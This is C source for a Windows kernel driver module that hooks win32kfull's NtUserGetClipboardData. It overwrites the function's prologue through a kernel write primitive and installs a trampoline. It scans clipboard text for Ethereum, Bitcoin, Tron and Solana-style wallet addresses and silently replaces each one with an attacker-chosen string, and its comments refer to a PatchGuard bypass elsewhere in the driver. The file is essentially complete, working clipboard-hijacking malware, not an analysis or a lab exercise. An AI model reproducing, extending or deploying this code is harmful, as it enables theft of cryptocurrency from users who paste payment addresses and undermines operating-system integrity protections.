#include "ClipboardHook.h"
#include "KernelWrite.h"
#include <ntddk.h>

//
// win32kfull build 10.0.26100.4343 RE facts:
//   NtUserGetClipboardData = image_base + 0xA5A50
//   14-byte relocatable prologue (no RIP-relative, no stack refs below entry):
//     48 8B C4                mov rax, rsp
//     48 89 58 08             mov [rax+8], rbx
//     48 89 70 10             mov [rax+0x10], rsi
//     57                      push rdi
//     41 54                   push r12
//   The body keeps RAX (entry RSP) intact and the epilogue restores rbx/rsi
//   from [rax+8]/[rax+0x10], so the prologue can be replayed verbatim inside
//   an executable trampoline before jumping to entry + 14.
//
#define WIN32KFULL_RVA_NTUSERGETCLIPBOARDDATA 0xA5A50
#define CLIP_PROLOGUE_LEN 14
#define CF_UNICODETEXT 0x000D

static const UCHAR g_ExpectedPrologue[CLIP_PROLOGUE_LEN] = {
    0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08,
    0x48, 0x89, 0x70, 0x10, 0x57, 0x41, 0x54};

#define CLIP_POOL_TAG 'pTlC'

//
// Clipboard state. Everything is touched only from the single device-control
// dispatch thread, except the payload which the stub (running in an arbitrary
// clipboard-reading process) reads. Non-paged, plain globals.
//
static BOOLEAN g_ClipArmed = FALSE;
static PVOID g_ClipTarget = NULL; // runtime NtUserGetClipboardData address
static UCHAR g_ClipSavedPrologue[CLIP_PROLOGUE_LEN];

static WCHAR g_ClipPayload[CLIP_MAX_TEXT_CHARS];
static ULONG g_ClipPayloadChars = 0; // including NUL, 0 = none set

typedef PVOID(NTAPI *FN_CLIP_ORIGINAL)(ULONG Format, PVOID Out16);

//
// Trampoline: 14 saved prologue bytes + FF 25 00 00 00 00 (jmp [rip+0]) + the
// 8-byte continuation address (target + 14). Lives in .text so it is committed
// executable memory; seeded at arm time via KernelWrite (CR0.WP).
//
#pragma section(".text")
__declspec(allocate(".text")) static UCHAR g_ClipTrampoline[28];
static FN_CLIP_ORIGINAL g_ClipOrigFn = NULL;

//
// Runs in place of the original prologue. The patch is a plain JMP into this C
// function, so entry state matches the x64 ABI the original caller expects:
// RCX=Format, RDX=Out16, [rsp]=caller return address. The function returns the
// section handle in RAX and its `ret` pops the original caller's return
// address.
//

static BOOLEAN IsHexDigit(WCHAR c) {
  return (c >= L'0' && c <= L'9') || (c >= L'a' && c <= L'f') ||
         (c >= L'A' && c <= L'F');
}

static BOOLEAN IsAlnumChar(WCHAR c) {
  return (c >= L'0' && c <= L'9') || (c >= L'a' && c <= L'z') ||
         (c >= L'A' && c <= L'Z');
}

static BOOLEAN IsBase58Char(WCHAR c) {
  return (c >= L'0' && c <= L'9') || (c >= L'A' && c <= L'H') ||
         (c >= L'J' && c <= L'N') || (c >= L'P' && c <= L'Z') ||
         (c >= L'a' && c <= L'k') || (c >= L'm' && c <= L'z');
}

//
// Decide whether a maximal alphanumeric run [p, p+Len) looks like a wallet
// address. Supports the common families:
//   EVM  : 0x<40 hex>                       (ETH, BSC, Polygon, ...)
//   base58: pure base58, 25..64 chars       (BTC, TRON T..., SOL, ...)
//   bech32: bc1/tb1 prefix + alnum         (segwit)
// Callers check the run length and the surrounding delimiters.
//
static BOOLEAN LooksLikeWalletRun(const WCHAR *p, ULONG Len) {
  ULONG i;

  if (p == NULL || Len < 25 || Len > 64) {
    return FALSE;
  }

  if (Len == 42 && p[0] == L'0' && (p[1] == L'x' || p[1] == L'X')) {
    for (i = 2; i < Len; i++) {
      if (!IsHexDigit(p[i])) {
        return FALSE;
      }
    }
    return TRUE;
  }

  if (Len >= 26 && ((p[0] == L'b' && p[1] == L'c' && p[2] == L'1') ||
                    (p[0] == L't' && p[1] == L'b' && p[2] == L'1'))) {
    for (i = 3; i < Len; i++) {
      if (!IsAlnumChar(p[i])) {
        return FALSE;
      }
    }
    return TRUE;
  }

  for (i = 0; i < Len; i++) {
    if (!IsBase58Char(p[i])) {
      return FALSE;
    }
  }
  return TRUE;
}

//
// Scan Text for wallet-address substrings and replace each one with the fake
// payload, collapsing the text in place (matches are at least 25 chars, the
// default fake is 20, so the result stays NUL-bounded in the same buffer).
// Returns how many addresses were replaced. Text is a NUL-terminated buffer of
// capacity CLIP_MAX_TEXT_CHARS.
//
static ULONG ReplaceWalletSubstrings(PWCHAR Text, ULONG CharLen) {
  ULONG i = 0;
  ULONG replacements = 0;
  ULONG fakeChars = g_ClipPayloadChars - 1; // excluding NUL

  if (Text == NULL || fakeChars == 0 || fakeChars >= CLIP_MAX_TEXT_CHARS) {
    return 0;
  }

  while (i < CharLen) {
    ULONG j;

    if (!IsAlnumChar(Text[i])) {
      i++;
      continue;
    }

    j = i;
    while (j < CharLen && IsAlnumChar(Text[j])) {
      j++;
    }

    // The run must not be glued to a longer alnum token on either side.
    if ((i > 0 && IsAlnumChar(Text[i - 1])) ||
        (j < CharLen && IsAlnumChar(Text[j]))) {
      i = j;
      continue;
    }

    if (!LooksLikeWalletRun(&Text[i], j - i)) {
      i = j;
      continue;
    }

    // Replace [i, j) with the fake. Always shrinks, so RtlMoveMemory of the
    // tail (overlapped towards lower addresses) is safe.
    RtlMoveMemory(Text + i + fakeChars, Text + j,
                  (CharLen - j) * sizeof(WCHAR));
    RtlCopyMemory(Text + i, g_ClipPayload, fakeChars * sizeof(WCHAR));
    CharLen = CharLen - (j - i) + fakeChars;
    Text[CharLen] = L'\0';
    replacements++;
    i += fakeChars;
  }

  return replacements;
}

static PVOID ClipboardStub(ULONG Format, PVOID Out16) {
  FN_CLIP_ORIGINAL original = g_ClipOrigFn;
  PVOID handle;

  if (original == NULL) {
    return NULL;
  }

  handle = original(Format, Out16);

  if (Format != CF_UNICODETEXT || handle == NULL || g_ClipPayloadChars == 0) {
    return handle;
  }

  //
  // Inspect the current text: read the section (offset 0 holds the UTF-16
  // string for this format) into a bounded stack snapshot. Only rewrite it
  // when it actually looks like a wallet address - every other copy (email,
  // notes, file names) passes through byte-for-byte.
  //
  {
    PVOID base = NULL;
    SIZE_T viewSize = 0;
    NTSTATUS status;
    WCHAR current[CLIP_MAX_TEXT_CHARS];
    ULONG curLen = 0;

    status = ZwMapViewOfSection(handle, (HANDLE)PsGetCurrentProcess(), &base, 0,
                                0, NULL, &viewSize, ViewUnmap, MEM_COMMIT,
                                PAGE_READWRITE);
    if (!NT_SUCCESS(status) || base == NULL) {
      DbgPrint("[ClipboardHook] inspect: ZwMapViewOfSection failed 0x%X "
               "(text passes through)\n",
               status);
      return handle;
    }

    while (curLen + 1 < CLIP_MAX_TEXT_CHARS &&
           curLen < (ULONG)(viewSize / sizeof(WCHAR)) &&
           ((PWCHAR)base)[curLen] != L'\0') {
      current[curLen] = ((PWCHAR)base)[curLen];
      curLen++;
    }
    current[curLen] = L'\0';

    {
      ULONG replaced = ReplaceWalletSubstrings(current, curLen);
      ULONG newLen = 0;
      if (replaced == 0) {
        ZwUnmapViewOfSection((HANDLE)PsGetCurrentProcess(), base);
        return handle;
      }

      DbgPrint("[ClipboardHook] target: replaced %lu wallet address%s with "
               "fake\n",
               replaced, replaced == 1 ? "" : "es");

      while (newLen < CLIP_MAX_TEXT_CHARS && current[newLen] != L'\0') {
        newLen++;
      }

      {
        ULONG newBytes = (newLen + 1) * sizeof(WCHAR); // + NUL
        SIZE_T writeSize = (viewSize < newBytes) ? viewSize : newBytes;
        RtlCopyMemory(base, current, writeSize);
      }
    }

    ZwUnmapViewOfSection((HANDLE)PsGetCurrentProcess(), base);
  }

  return handle;
}

//
// ZwQuerySystemInformation is not resolved by the loader's import pass, so
// resolve it at runtime like the existing PatchGuard code does.
//
typedef NTSTATUS(NTAPI *FN_QUERY_SYSTEM_INFORMATION)(ULONG SystemInfoClass,
                                                     PVOID Buffer,
                                                     ULONG BufferSize,
                                                     PULONG ReturnLength);

static FN_QUERY_SYSTEM_INFORMATION g_QuerySystemInformation = NULL;

//
// SYSTEM_MODULE_INFORMATION layout usable on build 26100 (mirrors the struct
// the rest of the driver already relies on for the PG bypass).
//
typedef struct _SYSTEM_MODULE_ENTRY_LONGS {
  HANDLE Section;          // +0x00
  PVOID MappedBase;        // +0x08
  PVOID ImageBase;         // +0x10
  ULONG ImageSize;         // +0x18
  ULONG Flags;             // +0x1C
  USHORT LoadOrderIndex;   // +0x20
  USHORT InitOrderIndex;   // +0x22
  USHORT LoadCount;        // +0x24
  USHORT OffsetToFileName; // +0x26
  UCHAR FullPathName[256]; // +0x28
} SYSTEM_MODULE_ENTRY_LONGS, *PSYSTEM_MODULE_ENTRY_LONGS;

typedef struct _SYSTEM_MODULE_INFORMATION_LONGS {
  ULONG Count;
  SYSTEM_MODULE_ENTRY_LONGS Module[1];
} SYSTEM_MODULE_INFORMATION_LONGS, *PSYSTEM_MODULE_INFORMATION_LONGS;

#define SYSTEM_MODULE_INFORMATION_CLASS 0x0B

static NTSTATUS ResolveRuntimePointer(PCWSTR RoutineName, PVOID *Out) {
  UNICODE_STRING name;
  PVOID addr;

  if (RoutineName == NULL || Out == NULL) {
    return STATUS_INVALID_PARAMETER;
  }

  RtlInitUnicodeString(&name, RoutineName);
  addr = MmGetSystemRoutineAddress(&name);
  if (addr == NULL) {
    return STATUS_NOT_FOUND;
  }

  *Out = addr;
  return STATUS_SUCCESS;
}

//
// Case-insensitive compare of the module's leaf name (from OffsetToFileName)
// against a plain ASCII file name like "win32kfull.sys". Kernel mode has no
// CRT _stricmp.
//
static BOOLEAN IsModuleLeafName(PCHAR Leaf, PCSTR Match) {
  UCHAR a, b;

  if (Leaf == NULL || Match == NULL) {
    return FALSE;
  }

  for (;;) {
    a = (UCHAR)*Leaf++;
    b = (UCHAR)*Match++;
    if (a >= 'a' && a <= 'z') {
      a -= ('a' - 'A');
    }
    if (b >= 'a' && b <= 'z') {
      b -= ('a' - 'A');
    }
    if (a != b) {
      return FALSE;
    }
    if (a == '\0') {
      return TRUE;
    }
  }
}

static PVOID SystemModuleBase(PCSTR ModuleLeafName) {
  ULONG bufferSize = 0;
  PSYSTEM_MODULE_INFORMATION_LONGS info = NULL;
  PVOID result = NULL;
  ULONG i;

  if (g_QuerySystemInformation == NULL || ModuleLeafName == NULL) {
    return NULL;
  }

  g_QuerySystemInformation(SYSTEM_MODULE_INFORMATION_CLASS, NULL, 0,
                           &bufferSize);
  if (bufferSize == 0) {
    return NULL;
  }

  info = (PSYSTEM_MODULE_INFORMATION_LONGS)ExAllocatePool2(
      POOL_FLAG_NON_PAGED, bufferSize, CLIP_POOL_TAG);
  if (info == NULL) {
    return NULL;
  }

  if (NT_SUCCESS(g_QuerySystemInformation(SYSTEM_MODULE_INFORMATION_CLASS, info,
                                          bufferSize, &bufferSize))) {
    for (i = 0; i < info->Count; i++) {
      PCHAR leaf = (PCHAR)&info->Module[i] + info->Module[i].OffsetToFileName;
      if (IsModuleLeafName(leaf, ModuleLeafName)) {
        result = info->Module[i].MappedBase;
        break;
      }
    }
  }

  ExFreePoolWithTag(info, CLIP_POOL_TAG);
  return result;
}

NTSTATUS ClipboardHookInitialize(VOID) {
  NTSTATUS status;

  status = ResolveRuntimePointer(L"ZwQuerySystemInformation",
                                 (PVOID *)&g_QuerySystemInformation);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[ClipboardHook] cannot resolve ZwQuerySystemInformation: 0x%X\n",
             status);
    return status;
  }

  //
  // Default fake address; CLIP_SET_TEXT can override it later.
  //
  RtlZeroMemory(g_ClipPayload, sizeof(g_ClipPayload));
  RtlCopyMemory(g_ClipPayload, L"FakeAddress123456789",
                sizeof(L"FakeAddress123456789"));
  g_ClipPayloadChars =
      (ULONG)(sizeof(L"FakeAddress123456789") / sizeof(WCHAR)); // incl. NUL

  //
  // win32kfull only exists in a signed-in desktop session, so the module is
  // resolved lazily on the first ARM instead of at load.
  //
  DbgPrint("[ClipboardHook] module initialized "
           "(default fake \"FakeAddress123456789\").\n");
  return STATUS_SUCCESS;
}

VOID ClipboardHookCleanup(VOID) {
  if (g_ClipArmed) {
    ClipboardHookDisarm();
  }
  g_ClipTarget = NULL;
}

NTSTATUS ClipboardHookSetText(PWCHAR Text, ULONG CharCount) {
  ULONG copyChars;

  if (Text == NULL || CharCount == 0) {
    return STATUS_INVALID_PARAMETER;
  }

  if (CharCount > CLIP_MAX_TEXT_CHARS - 1) {
    CharCount = CLIP_MAX_TEXT_CHARS - 1;
  }

  copyChars = 0;
  while (copyChars < CharCount && Text[copyChars] != L'\0') {
    copyChars++;
  }

  RtlCopyMemory(g_ClipPayload, Text, copyChars * sizeof(WCHAR));
  g_ClipPayload[copyChars] = L'\0';
  g_ClipPayloadChars = copyChars + 1; // including NUL

  DbgPrint("[ClipboardHook] set replacement text (%lu chars, %lu bytes).\n",
           copyChars, copyChars * sizeof(WCHAR));
  return STATUS_SUCCESS;
}

static NTSTATUS ReadOriginalPrologue(UCHAR Prologue[CLIP_PROLOGUE_LEN]) {
  RtlCopyMemory(Prologue, g_ClipTarget, CLIP_PROLOGUE_LEN);
  return STATUS_SUCCESS;
}

NTSTATUS ClipboardHookArm(VOID) {
  UCHAR original[CLIP_PROLOGUE_LEN];
  UCHAR patch[CLIP_PROLOGUE_LEN];
  UCHAR trampoline[28];
  PVOID continuation;
  PVOID stubAddress;
  ULONG i;
  NTSTATUS status;

  if (g_ClipArmed) {
    return STATUS_SUCCESS;
  }

  if (g_ClipTarget == NULL) {
    PVOID win32kfull = SystemModuleBase("win32kfull.sys");
    if (win32kfull == NULL) {
      DbgPrint("[ClipboardHook] ARM: win32kfull.sys not present in "
               "SystemModuleInformation\n");
      return STATUS_NOT_FOUND;
    }
    g_ClipTarget =
        (PVOID)((ULONG_PTR)win32kfull + WIN32KFULL_RVA_NTUSERGETCLIPBOARDDATA);
    DbgPrint("[ClipboardHook] ARM: win32kfull %p, NtUserGetClipboardData %p\n",
             win32kfull, g_ClipTarget);
  }

  status = ReadOriginalPrologue(original);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[ClipboardHook] ARM: cannot read prologue (0x%X)\n", status);
    return status;
  }

  for (i = 0; i < CLIP_PROLOGUE_LEN; i++) {
    if (original[i] != g_ExpectedPrologue[i]) {
      DbgPrint("[ClipboardHook] ARM: prologue mismatch at offset %lu (got "
               "0x%02X, want 0x%02X) - win32kfull revision changed\n",
               i, original[i], g_ExpectedPrologue[i]);
      DbgPrint("[ClipboardHook]                got bytes:");
      for (i = 0; i < CLIP_PROLOGUE_LEN; i++) {
        DbgPrint(" %02X", original[i]);
      }
      DbgPrint("\n");
      return STATUS_INVALID_IMAGE_FORMAT;
    }
  }

  //
  // Seed the executable trampoline. jmp [rip+0] means "fetch the 8 bytes that
  // follow", so the last 8 bytes hold the continuation address.
  //
  continuation = (PVOID)((ULONG_PTR)g_ClipTarget + CLIP_PROLOGUE_LEN);

  RtlCopyMemory(trampoline, original, CLIP_PROLOGUE_LEN);
  trampoline[14] = 0xFF;
  trampoline[15] = 0x25;
  trampoline[16] = trampoline[17] = trampoline[18] = trampoline[19] = 0;
  trampoline[20] = trampoline[21] = 0;
  RtlCopyMemory(&trampoline[22], &continuation, sizeof(continuation));

  status = KernelWrite((PVOID)g_ClipTrampoline, trampoline, sizeof(trampoline));
  if (!NT_SUCCESS(status)) {
    DbgPrint("[ClipboardHook] ARM: trampoline write failed 0x%X\n", status);
    return status;
  }

  g_ClipOrigFn = (FN_CLIP_ORIGINAL)(PVOID)g_ClipTrampoline;

  //
  // Replace the real prologue: mov rax, <stub>; jmp rax; nop; nop = 14 bytes.
  // Keep the verified original bytes around so DISARM can restore them even
  // though reading the target now would return the patch itself.
  //
  RtlCopyMemory(g_ClipSavedPrologue, original, CLIP_PROLOGUE_LEN);
  stubAddress = (PVOID)&ClipboardStub;
  patch[0] = 0x48;
  patch[1] = 0xB8;
  RtlCopyMemory(&patch[2], &stubAddress, sizeof(stubAddress));
  patch[10] = 0xFF;
  patch[11] = 0xE0;
  patch[12] = 0x90;
  patch[13] = 0x90;

  status = KernelWrite(g_ClipTarget, patch, sizeof(patch));
  if (!NT_SUCCESS(status)) {
    DbgPrint("[ClipboardHook] ARM: prologue patch failed 0x%X\n", status);
    return status;
  }

  KeInvalidateAllCaches();

  g_ClipArmed = TRUE;
  DbgPrint("[ClipboardHook] ARM: hook installed at %p (stub %p, trampoline %p,"
           " continuation %p)\n",
           g_ClipTarget, ClipboardStub, g_ClipTrampoline, continuation);
  return STATUS_SUCCESS;
}

NTSTATUS ClipboardHookDisarm(VOID) {
  NTSTATUS status;

  if (!g_ClipArmed) {
    return STATUS_SUCCESS;
  }

  //
  // Restore the exact bytes captured at ARM time. Reading the target now would
  // return our own patch, so g_ClipSavedPrologue is the only correct source.
  //
  status = KernelWrite(g_ClipTarget, g_ClipSavedPrologue, CLIP_PROLOGUE_LEN);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[ClipboardHook] DISARM: prologue restore failed 0x%X\n", status);
    return status;
  }

  KeInvalidateAllCaches();

  g_ClipOrigFn = NULL;
  g_ClipArmed = FALSE;
  DbgPrint("[ClipboardHook] DISARM: hook removed from %p\n", g_ClipTarget);
  return STATUS_SUCCESS;
}

NTSTATUS ClipboardHookStatus(PBOOLEAN Armed) {
  if (Armed == NULL) {
    return STATUS_INVALID_PARAMETER;
  }
  *Armed = g_ClipArmed;
  return STATUS_SUCCESS;
}